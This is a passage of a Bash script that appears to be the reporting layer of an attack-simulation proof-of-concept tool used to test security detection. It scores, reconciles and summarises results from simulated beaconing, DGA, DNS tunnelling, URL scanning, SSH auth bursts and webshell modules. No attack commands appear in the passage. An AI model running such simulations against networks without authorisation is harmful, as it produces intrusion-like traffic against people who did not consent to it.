        poc_customer_append "${POC_CUSTOMER_REPORT}" "${line}"
    done
}

poc_customer_validation_emit() {
    local line
    for line in "$@"; do
        [[ -z "${line}" ]] && continue
        poc_obs_append_log "${line}"
        poc_customer_append "${POC_CUSTOMER_LOG}" "${line}"
        poc_customer_append "${POC_CUSTOMER_VALIDATION}" "${line}"
    done
}

log_http_url_scan_target_summary() {
    local target="$1" requests="$2" responses="$3"
    local cnt_200="$4" cnt_301="$5" cnt_302="$6" cnt_400="$7" cnt_401="$8"
    local cnt_403="$9" cnt_404="${10}" cnt_405="${11}" cnt_500="${12}" cnt_timeout="${13}"
    local cnt_failed="${14}" cnt_success="${15}" fail_ratio="${16}" success_ratio=0
    local block="" msg=""
    requests=$(safe_int "${requests}")
    responses=$(safe_int "${responses}")
    cnt_200=$(safe_int "${cnt_200}")
    cnt_301=$(safe_int "${cnt_301}")
    cnt_302=$(safe_int "${cnt_302}")
    cnt_400=$(safe_int "${cnt_400}")
    cnt_401=$(safe_int "${cnt_401}")
    cnt_403=$(safe_int "${cnt_403}")
    cnt_404=$(safe_int "${cnt_404}")
    cnt_405=$(safe_int "${cnt_405}")
    cnt_500=$(safe_int "${cnt_500}")
    cnt_timeout=$(safe_int "${cnt_timeout}")
    cnt_failed=$(safe_int "${cnt_failed}")
    cnt_success=$(safe_int "${cnt_success}")
    fail_ratio=$(safe_int "${fail_ratio}")
    (( requests > 0 )) && success_ratio=$((cnt_success * 100 / requests))
    block="HTTP_URL_SCAN_TARGET_SUMMARY

target=${target}
requests=${requests}
responses=${responses}
http_200=${cnt_200}
http_301=${cnt_301}
http_302=${cnt_302}
http_400=${cnt_400}
http_401=${cnt_401}
http_403=${cnt_403}
http_404=${cnt_404}
http_405=${cnt_405}
http_500=${cnt_500}
timeout=${cnt_timeout}
success=${cnt_success}
failed=${cnt_failed}
success_ratio=${success_ratio}%
fail_ratio=${fail_ratio}%"
    msg="HTTP_URL_SCAN_TARGET_SUMMARY target=${target} requests=${requests} responses=${responses} http_200=${cnt_200} http_301=${cnt_301} http_302=${cnt_302} http_400=${cnt_400} http_401=${cnt_401} http_403=${cnt_403} http_404=${cnt_404} http_405=${cnt_405} http_500=${cnt_500} timeout=${cnt_timeout} success=${cnt_success} failed=${cnt_failed} success_ratio=${success_ratio}% fail_ratio=${fail_ratio}%"
    state_append "http_url_scan_target_summary.log" "${msg}"
    log_message "OK" "${msg}" >&2
    poc_customer_emit_block "${block}"
}

log_detection_quality() {
    local stage="$1" events="$2" duration="$3" targets="$4" classification="$5" quality="$6" reason="$7"
    local block=""
    if declare -F evidence_detection_quality_allowed >/dev/null 2>&1; then
        if ! evidence_detection_quality_allowed "${stage}" "${quality}"; then
            log_message "WARN" "DETECTION_QUALITY_BLOCKED stage=${stage} requested_quality=${quality} reason=validated_count=0"
            quality="low"
            reason="validation_not_proven: ${reason}"
        fi
    fi
    block="DETECTION_QUALITY

stage=${stage}
events_generated=${events}
duration=${duration}
targets=${targets}
classification=${classification}
quality=${quality}

reason=${reason}"
    state_append "detection_quality.log" "stage=${stage} events=${events} duration=${duration} targets=${targets} classification=${classification} quality=${quality} reason=${reason}"
    log_message "OK" "DETECTION_QUALITY stage=${stage} quality=${quality} reason=${reason}" >&2
    poc_customer_emit_block "${block}"
}

log_detection_score() {
    local module="$1" score="$2" reason="$3"
    local block=""
    score=$(safe_int "${score}")
    (( score < 0 )) && score=0
    (( score > 100 )) && score=100
    block="DETECTION_SCORE

${module}=${score}
reason=${reason}"
    state_append "detection_score.log" "module=${module} score=${score} reason=${reason}"
    log_message "OK" "DETECTION_SCORE ${module}=${score} reason=${reason}" >&2
    poc_customer_emit_block "${block}"
    case "${module}" in
        HTTP_URL_SCAN) DETECTION_SCORE_HTTP_URL_SCAN="${score}" ;;
        BEACON) DETECTION_SCORE_BEACON="${score}" ;;
        DGA) DETECTION_SCORE_DGA="${score}" ;;
        DNS_TUNNEL) DETECTION_SCORE_DNS_TUNNEL="${score}" ;;
    esac
}

compute_detection_score_http_url_scan() {
    local attempted="${1:-${HTTP_REQUESTS_ATTEMPTED:-0}}" responses="${2:-${WEB_RESPONSES_RECEIVED:-0}}"
    local target_count="${3:-${HTTP_FOLLOWUP_SELECTED_HOSTS:-1}}" duration="${4:-${HTTP_SCAN_WINDOW_SECONDS:-0}}"
    local score=0 reason=""
    attempted=$(safe_int "${attempted}")
    responses=$(safe_int "${responses}")
    target_count=$(safe_int "${target_count}")
    duration=$(safe_int "${duration}")
    (( target_count < 1 )) && target_count=1
    (( attempted > 0 )) && score=$((score + 40))
    (( responses > 0 )) && score=$((score + 40))
    (( target_count >= 2 )) && score=$((score + 10))
    (( score > 100 )) && score=100
    reason="${attempted} requests across ${target_count} host(s), ${responses} responses (${duration}s)"
    log_detection_score "HTTP_URL_SCAN" "${score}" "${reason}"
}

compute_detection_score_beacon() {
    local attempted="${1:-${EXTERNAL_CALLBACK_ATTEMPTED:-0}}" connected="${2:-${EXTERNAL_CALLBACK_CONNECTED:-0}}"
    local ratio=0 score=0 reason=""
    attempted=$(safe_int "${attempted}")
    connected=$(safe_int "${connected}")
    (( attempted > 0 )) && ratio=$((connected * 100 / attempted))
    BEACON_CALLBACK_RATIO="${ratio}"
    score=$((attempted * 40 / 100 + ratio / 5))
    (( BEACON_LOW_SLOW_ATTEMPTED >= 15 )) && score=$((score + 15))
    (( BEACON_BURST_ATTEMPTED >= 30 )) && score=$((score + 15))
    (( score > 100 )) && score=100
    reason="callback_ratio=${ratio}% low_slow=${BEACON_LOW_SLOW_ATTEMPTED} burst=${BEACON_BURST_ATTEMPTED} connected=${connected}"
    log_detection_score "BEACON" "${score}" "${reason}"
}

compute_detection_score_dga() {
    local nx="${1:-${DGA_NXDOMAIN_COUNT:-0}}" total="${2:-${DGA_TOTAL_QUERIES:-0}}" resolved="${3:-${DGA_RESOLVED_COUNT:-0}}"
    local score=0 reason=""
    nx=$(safe_int "${nx}")
    total=$(safe_int "${total}")
    resolved=$(safe_int "${resolved}")
    score=$((nx * 80 / 100))
    (( resolved >= 1 )) && score=$((score + 10))
    (( total >= 80 )) && score=$((score + 10))
    (( score > 100 )) && score=100
    reason="nxdomain=${nx} total_queries=${total} resolved=${resolved}"
    log_detection_score "DGA" "${score}" "${reason}"
}

compute_detection_score_dns_tunnel() {
    local queries="${1:-${DNS_QUERIES_ATTEMPTED:-0}}" entropy="${2:-${DNS_TUNNEL_APPROX_ENTROPY:-0}}"
    local score=0 reason=""
    queries=$(safe_int "${queries}")
    entropy=$(safe_int "${entropy}")
    score=$((queries * 50 / 300))
    (( entropy >= 45 )) && score=$((score + 25))
    (( entropy >= 30 )) && score=$((score + 10))
    (( queries >= 200 )) && score=$((score + 15))
    (( score > 100 )) && score=100
    reason="${queries} DNS tunnel queries with entropy_score=${entropy} likelihood=${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"
    log_detection_score "DNS_TUNNEL" "${score}" "${reason}"
}


log_beacon_summary() {
    local mode="$1" attempted="$2" success="$3" failed="$4" callback_ratio="$5"
    local block=""
    block="BEACON_SUMMARY

mode=${mode}
attempted=${attempted}
success=${success}
failed=${failed}
callback_ratio=${callback_ratio}%"
    state_append "beacon_summary.log" "mode=${mode} attempted=${attempted} success=${success} failed=${failed} callback_ratio=${callback_ratio}%"
    log_message "OK" "BEACON_SUMMARY mode=${mode} attempted=${attempted} success=${success} failed=${failed} callback_ratio=${callback_ratio}%" >&2
    poc_customer_emit_block "${block}"
}

resolve_dga_failure_reason_code() {
    local resolver="${1:-${DGA_DNS_SERVER:-unknown}}" dns_server="${2:-${DGA_DNS_SERVER:-unknown}}"
    local queries_attempted="${3:-${DGA_QUERIES_ATTEMPTED:-0}}" queries_sent="${4:-${DGA_QUERIES_SENT:-0}}"
    local responses="${5:-0}" nxdomain="${6:-${DGA_NXDOMAIN_COUNT:-0}}" timeout="${7:-${DGA_TIMEOUT_COUNT:-0}}"
    if [[ "${DGA_SKIP_REASON}" == "dns_resolver_unavailable" && -z "${DGA_DNS_SERVER}" && DGA_TOTAL_QUERIES -eq 0 ]]; then
        printf 'no_dns_connectivity'
        return 0
    fi
    if (( queries_sent == 0 && queries_attempted == 0 )); then
        printf 'dig_nslookup_host_unavailable'
        return 0
    fi
    if (( timeout > 0 && nxdomain == 0 && responses == 0 )); then
        printf 'dns_server_refused_queries'
        return 0
    fi
    if (( queries_sent > 0 && nxdomain == 0 && responses == 0 )); then
        printf 'no_nxdomain_responses'
        return 0
    fi
    if (( DGA_RESOLVED_COUNT == 0 && nxdomain > 0 )); then
        printf 'resolvable_phase_no_ip'
        return 0
    fi
    printf '%s' "${DGA_SKIP_REASON:-dga_simulation_failed}"
}

log_dga_failure_analysis() {
    local reason="" block=""
    reason=$(resolve_dga_failure_reason_code)
    DGA_FAILURE_REASON="${reason}"
    block="DGA_FAILURE_ANALYSIS

resolver=${DGA_QUERY_TOOL:-unknown}
dns_server=${DGA_DNS_SERVER:-unknown}
queries_attempted=${DGA_QUERIES_ATTEMPTED:-${DGA_TOTAL_QUERIES:-0}}
queries_sent=${DGA_QUERIES_SENT:-${DGA_TOTAL_QUERIES:-0}}
responses=${DGA_RESOLVED_COUNT:-0}
nxdomain=${DGA_NXDOMAIN_COUNT:-0}
timeout=${DGA_TIMEOUT_COUNT:-0}
reason=${reason}"
    state_append "dga_failure_analysis.log" "resolver=${DGA_QUERY_TOOL:-unknown} dns_server=${DGA_DNS_SERVER:-unknown} reason=${reason}"
    log_message "WARN" "DGA_FAILURE_ANALYSIS reason=${reason} dns_server=${DGA_DNS_SERVER:-unknown}" >&2
    poc_customer_emit_block "${block}"
}

http_ua_stage_aggregator_commit() {
    HTTP_UA_STAGE_COVERAGE_TOTAL="${HTTP_UA_COVERAGE_TOTAL}"
    HTTP_UA_STAGE_COVERAGE_PRESENT="${HTTP_UA_COVERAGE_PRESENT}"
    HTTP_UA_STAGE_COVERAGE_MISSING="${HTTP_UA_COVERAGE_MISSING}"
    HTTP_UA_STAGE_COVERAGE_PERCENT="${HTTP_UA_COVERAGE_PERCENT}"
    HTTP_UA_STAGE_COVERAGE_NORMAL="${HTTP_UA_COVERAGE_NORMAL}"
    HTTP_UA_STAGE_COVERAGE_RARE="${HTTP_UA_COVERAGE_RARE}"
    HTTP_UA_STAGE_COVERAGE_PAYLOAD="${HTTP_UA_COVERAGE_PAYLOAD}"
    HTTP_UA_STAGE_COVERAGE_ABNORMAL="${HTTP_UA_COVERAGE_ABNORMAL}"
}

poc_log_summary_consistency_check() {
    local stage="$1" realtime_total="$2" final_total="$3" result=pass
    realtime_total=$(safe_int "${realtime_total}")
    final_total=$(safe_int "${final_total}")
    if (( realtime_total != final_total )); then
        result=fail
    fi
    log_message "OK" "SUMMARY_CONSISTENCY_CHECK stage=${stage} realtime_total=${realtime_total} final_total=${final_total} result=${result}" >&2
    state_append "summary_consistency.log" "SUMMARY_CONSISTENCY_CHECK stage=${stage} realtime_total=${realtime_total} final_total=${final_total} result=${result}"
}

poc_final_internal_consistency_check() {
    local module="" counts="" planned=0 attempted=0 executed=0 successful=0 bug=false result=pass
    local -a modules=(TELEM_DNS_COUNTS TELEM_DGA_COUNTS TELEM_CALLBACK_COUNTS TELEM_HTTP_COUNTS)
    log_message "OK" "FINAL_INTERNAL_CONSISTENCY_CHECK begin" >&2
    state_append "final_validation.log" "FINAL_INTERNAL_CONSISTENCY_CHECK begin"
    for module in "${modules[@]}"; do
        counts="${!module:-}"
        [[ -z "${counts}" ]] && continue
        planned=$(safe_int "$(sed -n 's/.*planned=\([0-9][0-9]*\).*/\1/p' <<< "${counts}")")
        attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${counts}")")
        executed=$(safe_int "$(sed -n 's/.*sent=\([0-9][0-9]*\).*/\1/p' <<< "${counts}")")
        [[ "${executed}" == 0 ]] && executed=$(safe_int "$(sed -n 's/.*executed=\([0-9][0-9]*\).*/\1/p' <<< "${counts}")")
        successful=$(safe_int "$(sed -n 's/.*validated=\([0-9][0-9]*\).*/\1/p' <<< "${counts}")")
        [[ "${successful}" == 0 ]] && successful=$(safe_int "$(sed -n 's/.*successful=\([0-9][0-9]*\).*/\1/p' <<< "${counts}")")
        log_message "OK" "FINAL_INTERNAL_CONSISTENCY_CHECK module=${module} planned=${planned} attempted=${attempted} executed=${executed} successful=${successful}" >&2
        state_append "final_validation.log" "FINAL_INTERNAL_CONSISTENCY_CHECK module=${module} planned=${planned} attempted=${attempted} executed=${executed} successful=${successful}"
        if (( successful > executed || executed > attempted || ( planned > 0 && attempted > planned * 2 ) )); then
            bug=true
            log_message "ERROR" "COUNTER_CONSISTENCY_BUG module=${module} planned=${planned} attempted=${attempted} executed=${executed} successful=${successful}" >&2
            state_append "final_validation.log" "COUNTER_CONSISTENCY_BUG module=${module} planned=${planned} attempted=${attempted} executed=${executed} successful=${successful}"
        fi
    done
    [[ "${bug}" == true ]] && result=fail
    log_message "OK" "FINAL_INTERNAL_CONSISTENCY_CHECK result=${result}" >&2
    state_append "final_validation.log" "FINAL_INTERNAL_CONSISTENCY_CHECK result=${result}"
    [[ "${bug}" == true ]] && return 1
    return 0
}

dns_validation_effective_query_counts() {
    local sent=0 responded=0
    sent=$(safe_int "${DNS_QUERY_SENT_COUNT:-0}")
    responded=$(safe_int "${DNS_QUERY_RESPONDED_COUNT:-0}")
    (( sent < 1 )) && sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
    (( responded < 1 )) && responded=$(safe_int "${DGA_QUERY_RESPONDED_COUNT:-0}")
    (( sent < 1 )) && sent=$(safe_int "${DNS_QUERIES_ATTEMPTED:-0}")
    (( responded < 1 )) && responded=$(safe_int "${DNS_TUNNEL_ACTUAL_DNS_QUERIES:-0}")
    printf '%s %s' "${sent}" "${responded}"
}

dns_reconcile_resolver_validation_from_queries() {
    local sent=0 responded=0 ratio=0 actual_sent=0
    read -r sent responded <<< "$(dns_validation_effective_query_counts)"
    actual_sent="${sent}"
    if (( actual_sent == 0 )); then
        DNS_RESOLVER_VALIDATION_RESULT="failed"
    elif (( sent > 0 && responded == 0 )); then
        DNS_RESOLVER_VALIDATION_RESULT="failed"
    elif (( sent > 0 )); then
        ratio=$((responded * 100 / sent))
        if (( ratio >= 80 )); then
            DNS_RESOLVER_VALIDATION_RESULT="success"
        elif (( responded == 0 )); then
            DNS_RESOLVER_VALIDATION_RESULT="failed"
        fi
    fi
}

dns_fail_fast_check() {
    local generated=0 sent=0
    generated=$(safe_int "${DNS_QUERY_GENERATED:-0}")
    sent=$(safe_int "${DNS_QUERY_SENT_COUNT:-0}")
    (( generated == 0 )) && generated=$(safe_int "${DGA_QUERY_GENERATED:-0}")
    (( sent == 0 )) && sent=$(safe_int "${DGA_QUERY_SENT_COUNT:-0}")
    if (( generated > 0 && sent == 0 )); then
        log_message "ERROR" "DNS_FAIL_FAST generated=${generated} actual_sent=${sent} reason=query_generation_without_execution" >&2
        state_append "dns_server_validation.log" "DNS_FAIL_FAST generated=${generated} actual_sent=${sent} reason=query_generation_without_execution"
        return 1
    fi
    return 0
}

dns_validation_consistency_check() {
    local sent=0 responded=0 ratio=0 result="${DNS_RESOLVER_VALIDATION_RESULT:-failed}"
    local decision="" reason="" logic_bug=no
    read -r sent responded <<< "$(dns_validation_effective_query_counts)"
    (( sent > 0 )) && ratio=$((responded * 100 / sent))
    dns_reconcile_resolver_validation_from_queries
    result="${DNS_RESOLVER_VALIDATION_RESULT:-failed}"
    log_message "OK" "DNS_VALIDATION_CONSISTENCY_CHECK resolver_validation_result=${result} query_sent=${sent} query_responded=${responded} ratio=${ratio}%" >&2
    state_append "dns_server_validation.log" "DNS_VALIDATION_CONSISTENCY_CHECK resolver_validation_result=${result} query_sent=${sent} query_responded=${responded} ratio=${ratio}%"
    if [[ "${result}" == success ]]; then
        if (( sent == 0 )); then
            logic_bug=yes
            decision=bug
            reason="success_with_zero_queries_sent"
        elif (( responded == 0 )); then
            logic_bug=yes
            decision=bug
            reason="success_with_zero_responses"
        elif (( sent > 0 && ratio < 20 )); then
            logic_bug=yes
            decision=bug
            reason="success_with_low_response_ratio"
        else
            decision=pass
            reason="responses_match_queries"
        fi
    elif [[ "${result}" == failed ]]; then
        if (( sent > 0 && responded > 0 && ratio >= 80 )); then
            decision=pass
            reason="reconciled_from_queries"
        else
            decision=failed
            reason="validation_failed_or_insufficient_responses"
        fi
    else
        decision="${result}"
        reason="resolver_validation_${result}"
    fi
    log_message "OK" "DNS_VALIDATION_REASON resolver_validation_result=${result} query_sent=${sent} query_responded=${responded} ratio=${ratio}% decision=${decision} reason=${reason}" >&2
    state_append "dns_server_validation.log" "DNS_VALIDATION_REASON resolver_validation_result=${result} query_sent=${sent} query_responded=${responded} ratio=${ratio}% decision=${decision} reason=${reason}"
    if [[ "${logic_bug}" == yes ]]; then
        log_message "ERROR" "DNS_VALIDATION_LOGIC_BUG resolver_validation_result=${result} query_sent=${sent} query_responded=${responded} ratio=${ratio}%" >&2
        state_append "dns_server_validation.log" "DNS_VALIDATION_LOGIC_BUG resolver_validation_result=${result} query_sent=${sent} query_responded=${responded} ratio=${ratio}%"
        dns_reconcile_resolver_validation_from_queries
    fi
}

poc_emit_final_root_cause_summary() {
    local env_issues="" script_issues="" telemetry="" block=""
    local http_dr="${DETECTION_LIKELIHOOD_URL_SCAN:-low}"
    local dns_dr="${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"
    local dga_dr="${DGA_DETECTION_LIKELIHOOD:-LOW}"
    local http_dr_label="LOW" dns_dr_label="LOW" dga_dr_label="LOW" ntld_dr_label="LOW"
    local readiness_overall="LOW" readiness_reason=""

    [[ "${EXTERNAL_CALLBACK_SKIP_REASON}" == listener_unreachable ]] || \
        { (( EXTERNAL_CALLBACK_ATTEMPTED > 0 && EXTERNAL_CALLBACK_CONNECTED == 0 )) && \
            env_issues="${env_issues} listener unreachable (callback attempted=${EXTERNAL_CALLBACK_ATTEMPTED});"; }
    [[ "${EXTERNAL_CALLBACK_STATUS}" == skipped && -n "${EXTERNAL_CALLBACK_SKIP_REASON}" ]] && \
        env_issues="${env_issues} external callback skipped (${EXTERNAL_CALLBACK_SKIP_REASON});"
    grep -q 'skipped_network_timeout\|skipped_connection_refused\|skipped_filtered' "${LOCAL_STATE_DIR}/stage_results.log" 2>/dev/null && \
        env_issues="${env_issues} egress/firewall blocked (precheck skips in stage log);"

    [[ "${SCRIPT_ISSUE_FLAGS}" == *dns_stats_bug* ]] && script_issues="${script_issues} dns stats bug (entropy recomputed from generated FQDN list);"
    [[ "${SCRIPT_ISSUE_FLAGS}" == *counter_mismatch* ]] && script_issues="${script_issues} counter mismatch;"
    grep -q 'SUMMARY_CONSISTENCY_CHECK.*result=fail' "${LOCAL_STATE_DIR}/summary_consistency.log" 2>/dev/null && \
        script_issues="${script_issues} http summary counter mismatch;"

    case "${FINAL_VAL_HTTP_FOLLOWUP:-skipped}" in success|partial)
        telemetry="${telemetry} HTTP URL Scan (${HTTP_REQUESTS_ATTEMPTED:-0} requests);"
        ;;
    esac
    case "${FINAL_VAL_DNS_TUNNEL:-skipped}" in success|partial)
        telemetry="${telemetry} DNS Tunnel (${DNS_QUERIES_ATTEMPTED:-0} queries entropy=${DNS_TUNNEL_APPROX_ENTROPY:-0});"
        ;;
    esac
    case "${FINAL_VAL_DGA:-skipped}" in success|partial)
        telemetry="${telemetry} DGA (${DGA_TOTAL_QUERIES:-0} queries);"
        ;;
    esac
    (( SSH_AUTH_ATTEMPTED > 0 || SSH_ATTEMPTS_EXECUTED > 0 )) && \
        telemetry="${telemetry} SSH Auth Attempts (${SSH_ATTEMPTS_EXECUTED:-${SSH_AUTH_ATTEMPTED:-0}});"
    (( EDR_TEST_FILES_ATTEMPTED > 0 )) && telemetry="${telemetry} EDR Test Files (${EDR_TEST_FILES_ATTEMPTED});"

    [[ -z "${env_issues}" ]] && env_issues=" none"
    [[ -z "${script_issues}" ]] && script_issues=" none"
    [[ -z "${telemetry}" ]] && telemetry=" none"

    [[ "${http_dr}" =~ ^(high|HIGH)$ ]] && http_dr_label=HIGH
    [[ "${http_dr}" =~ ^(medium|MEDIUM)$ ]] && http_dr_label=MEDIUM
    [[ "${dns_dr}" == HIGH ]] && dns_dr_label=HIGH
    [[ "${dns_dr}" == MEDIUM ]] && dns_dr_label=MEDIUM
    [[ "${dga_dr}" == HIGH ]] && dga_dr_label=HIGH
    [[ "${dga_dr}" == MEDIUM ]] && dga_dr_label=MEDIUM
    [[ "${DNS_NEW_TLD_DETECTION_LIKELIHOOD:-LOW}" == HIGH ]] && ntld_dr_label=HIGH
    [[ "${DNS_NEW_TLD_DETECTION_LIKELIHOOD:-LOW}" == MEDIUM ]] && ntld_dr_label=MEDIUM

    if [[ "${http_dr_label}" == HIGH || "${dns_dr_label}" == HIGH || "${dga_dr_label}" == HIGH  ]]; then
        readiness_overall=HIGH
        readiness_reason="one or more modules HIGH (HTTP=${http_dr_label} DNS=${dns_dr_label} DGA=${dga_dr_label})"
    elif [[ "${http_dr_label}" == MEDIUM || "${dns_dr_label}" == MEDIUM || "${dga_dr_label}" == MEDIUM  ]]; then
        readiness_overall=MEDIUM
        readiness_reason="mixed MEDIUM telemetry modules"
    else
        readiness_reason="telemetry below HIGH/MEDIUM thresholds"
    fi

    block="FINAL_ROOT_CAUSE_SUMMARY

[Environment Issues]
- ${env_issues}

[Script Issues]
- ${script_issues}

[Telemetry Generated]
- ${telemetry}

[Detection Readiness]
- Overall: ${readiness_overall} (${readiness_reason})
- HTTP URL Scan: ${http_dr_label}
- DNS Tunnel: ${dns_dr_label}
- DGA: ${dga_dr_label}
- DNS New TLD: ${ntld_dr_label}
- Webshell transport: effective=${WEBSHELL_EFFECTIVE_METHOD:-${WEBSHELL_METHOD:-auto}} user=${WEBSHELL_USER_METHOD:-auto}"
    log_message "OK" "${block}" >&2
    state_append "final_root_cause_summary.log" "${block}"
}

poc_health_status_label() {
    case "${1,,}" in
        success|fallback_success|passed|pass) printf 'PASS' ;;
        partial|warn|degraded) printf 'PARTIAL' ;;
        skipped) printf 'SKIP' ;;
        *) printf 'FAIL' ;;
    esac
}

poc_emit_module_diagnostic() {
    local module="$1" exec_status="$2" env_status="$3" root_cause="$4" action="$5"
    local msg="MODULE_DIAGNOSTIC module=${module} execution_status=${exec_status} environment_status=${env_status} root_cause=${root_cause} recommended_action=${action}"
    state_append "module_diagnostic.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

poc_emit_all_module_diagnostics() {
    local dns_exec=FAILED dns_env=FAILED dns_rc="" dns_action=review_dns_tunnel_logs
    local http_exec=FAILED http_env=FAILED http_rc="" http_action=review_http_url_scan_logs
    local dga_exec=FAILED dga_env=FAILED dga_rc="" dga_action=review_dga_simulation_logs

    local _dns_s
    _dns_s=$(build_module_summary_from_events "DNS_TUNNEL" 2>/dev/null || true)
    if (( $(safe_int "$(event_summary_field "${_dns_s}" sent 0)") > 0 )); then dns_exec=SUCCESS; fi
    if [[ "${DNS_ENVIRONMENT_BLOCKED}" == true ]]; then
        dns_env=FAILED
        dns_rc="${DNS_ENVIRONMENT_BLOCK_REASON:-dns_visibility_failed}"
        dns_action=verify_dns_resolver_connectivity
    elif (( DNS_SERVER_OBSERVED_QUERIES > 0 )); then
        dns_env=SUCCESS
        dns_rc=server_observed_queries
    elif (( DNS_QUERY_RESPONDED_COUNT > 0 )); then
        dns_env=FAILED
        dns_rc=resolver_not_visible_to_sensor
        dns_action=verify_sensor_dns_visibility
    elif (( $(safe_int "$(event_summary_field "${_dns_s}" sent 0)") == 0 )); then
        dns_rc=no_queries_executed
    fi

    local _http_s
    _http_s=$(build_module_summary_from_events "HTTP_URL_SCAN" 2>/dev/null || true)
    if (( $(safe_int "$(event_summary_field "${_http_s}" attempted 0)") > 0 )); then http_exec=SUCCESS; fi
    if (( $(safe_int "$(event_summary_field "${_http_s}" completed 0)") > 0 )); then
        http_env=SUCCESS
        http_rc=web_responses_received
    elif (( $(safe_int "$(event_summary_field "${_http_s}" attempted 0)") > 0 )); then
        http_env=FAILED
        http_rc="${HTTP_URL_SCAN_ROOT_CAUSE:-no_web_responses}"
        http_action=verify_target_reachability_and_firewall
    else
        http_rc=no_http_requests_executed
    fi
    if [[ "${HTTP_URL_SCAN_FINAL_REASON}" == *logic_error* ]]; then
        http_exec=FAILED
        http_rc=script_logic_failure
        http_action=review_http_url_scan_script
    fi

    local _dga_s
    _dga_s=$(build_module_summary_from_events "DGA_SIMULATION" 2>/dev/null || true)
    if (( $(safe_int "$(event_summary_field "${_dga_s}" sent 0)") > 0 )); then dga_exec=SUCCESS; fi
    if [[ "${DNS_ENVIRONMENT_BLOCKED}" == true ]]; then
        dga_env=FAILED
        dga_rc="${DNS_ENVIRONMENT_BLOCK_REASON:-dns_visibility_failed}"
        dga_action=verify_dns_resolver_connectivity
    elif (( DGA_SERVER_OBSERVED_QUERIES > 0 )); then
        dga_env=SUCCESS
        dga_rc=server_observed_queries
    elif (( $(safe_int "$(event_summary_field "${_dga_s}" nxdomain 0)") > 0 )); then
        dga_env=FAILED
        dga_rc=resolver_not_visible_to_sensor
        dga_action=verify_sensor_dns_visibility
    elif (( $(safe_int "$(event_summary_field "${_dga_s}" sent 0)") == 0 )); then
        dga_rc=no_dga_queries_executed
    fi

    poc_emit_module_diagnostic "DNS_TUNNEL" "${dns_exec}" "${dns_env}" "${dns_rc:-n/a}" "${dns_action}"
    poc_emit_module_diagnostic "HTTP_URL_SCAN" "${http_exec}" "${http_env}" "${http_rc:-n/a}" "${http_action}"
    poc_emit_module_diagnostic "DGA" "${dga_exec}" "${dga_env}" "${dga_rc:-n/a}" "${dga_action}"
}

poc_emit_health_report() {
    local discovery ssh http dns dga callback env_note overall env_status=""
    discovery=$(poc_health_status_label "${FINAL_VAL_SERVICE_DISCOVERY:-skipped}")
    ssh=$(poc_health_status_label "${FINAL_VAL_SSH_FOLLOWUP:-skipped}")
    http=$(poc_health_status_label "${FINAL_VAL_HTTP_FOLLOWUP:-skipped}")
    dns=$(poc_health_status_label "${FINAL_VAL_DNS_TUNNEL:-skipped}")
    dga=$(poc_health_status_label "${FINAL_VAL_DGA:-skipped}")
    callback=$(poc_health_status_label "${FINAL_VAL_EXTERNAL_CALLBACK:-skipped}")
    if [[ "${DNS_ENVIRONMENT_BLOCKED}" == true ]]; then
        env_note="DNS Visibility Failed (${DNS_ENVIRONMENT_BLOCK_REASON:-unknown})"
        env_status=FAIL
    elif [[ "${DNS_VISIBILITY_DECISION}" == blocked || "${DNS_VISIBILITY_DECISION}" == fail ]]; then
        env_note="DNS Visibility Failed (${DNS_VISIBILITY_FAILURE_REASON:-unknown})"
        env_status=FAIL
    else
        env_note="OK"
        env_status=PASS
    fi
    case "${OVERALL_RESULT,,}" in
        success|passed) overall=SUCCESS ;;
        partial*) overall=PARTIAL_SUCCESS ;;
        failed|fail) overall=FAILED ;;
        *)
            case "${TELEMETRY_VAL_OVERALL:-}" in
                success) overall=SUCCESS ;;
                partial) overall=PARTIAL_SUCCESS ;;
                failed) overall=FAILED ;;
                *) overall=PARTIAL_SUCCESS ;;
            esac
            ;;
    esac
    local block="POC_HEALTH_REPORT

Discovery: ${discovery}
SSH: ${ssh}
HTTP: ${http}
DNS Tunnel: ${dns}
DGA: ${dga}
Callback: ${callback}
Environment: ${env_note} (${env_status})

Overall: ${overall}"
    log_message "OK" "${block}" >&2
    state_append "poc_health_report.log" "${block}"
    poc_obs_log "SUMMARY" "POC_HEALTH_REPORT overall=${overall} discovery=${discovery} http=${http} dns=${dns} dga=${dga} environment=${env_status}"
}

normalize_final_validation_status() {
    local raw="$1"
    case "${raw,,}" in
        success|passed|pass) printf 'success' ;;
        fallback_success) printf 'fallback_success' ;;
        partial|warn|degraded) printf 'partial' ;;
        skipped) printf 'skipped' ;;
        environment_failure|env_failure|env_blocked) printf 'environment_failure' ;;
        *) printf 'failed' ;;
    esac
}

final_validation_counts_as_success() {
    case "${1,,}" in
        success|fallback_success) return 0 ;;
        *) return 1 ;;
    esac
}

lookup_stage_result_status() {
    local label="$1" line status=""
    line=$(read_state_file_or_none "stage_results.log" | grep -F "${label}:" | tail -n1 || true)
    [[ -z "${line}" ]] && { printf 'unknown'; return 0; }
    status="${line#*: }"
    status="${status%% |*}"
    normalize_final_validation_status "${status}"
}

compute_and_log_final_validation() {
    local block="" success_count=0 partial_count=0 failed_count=0 total_required=0
    compute_final_telemetry_validation

    FINAL_VAL_SERVICE_DISCOVERY=$(lookup_stage_result_status "Service Discovery")
    [[ "${FINAL_VAL_SERVICE_DISCOVERY}" == unknown && "${SERVICES_DISCOVERED_TOTAL:-0}" -gt 0 ]] && FINAL_VAL_SERVICE_DISCOVERY="success"
    FINAL_VAL_HTTP_FOLLOWUP=$(normalize_final_validation_status "${TELEMETRY_VAL_HTTP_URL_SCAN:-${HTTP_URL_SCAN_STAGE_STATUS:-skipped}}")
    FINAL_VAL_SSH_FOLLOWUP=$(lookup_stage_result_status "SSH Auth Burst")
    [[ "${FINAL_VAL_SSH_FOLLOWUP}" == unknown ]] && FINAL_VAL_SSH_FOLLOWUP=$(lookup_stage_result_status "SSH Follow-up")
    FINAL_VAL_DNS_TUNNEL=$(normalize_final_validation_status "${TELEMETRY_VAL_DNS_TUNNEL:-${DNS_TUNNEL_STAGE_STATUS:-skipped}}")
    FINAL_VAL_DGA=$(normalize_final_validation_status "${TELEMETRY_VAL_DGA_SIMULATION:-${DGA_STAGE_STATUS:-skipped}}")
    FINAL_VAL_NEW_TLD=$(normalize_final_validation_status "${TELEMETRY_VAL_NEW_TLD:-${DNS_NEW_TLD_STAGE_STATUS:-skipped}}")
